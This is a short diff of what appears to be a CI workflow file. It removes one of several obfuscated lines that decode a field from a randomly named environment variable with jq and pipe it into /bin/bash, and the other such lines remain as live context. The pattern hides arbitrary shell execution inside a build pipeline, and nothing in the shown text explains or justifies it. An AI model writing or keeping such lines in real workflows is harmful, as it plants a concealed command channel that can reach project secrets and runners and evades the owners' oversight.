@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$lpwnz8896" | jq -r .vtc97568 | /bin/bash
           printf '%s' "$nrnw16" | jq -r .hc6 | /bin/bash
           printf '%s' "$bf493" | jq -r .wyfs6382 | /bin/bash
-          printf '%s' "$ulx620" | jq -r .hc9 | /bin/bash
           echo $hs333 | jq -r .hsss913 | /bin/bash
 
       - name: Save output
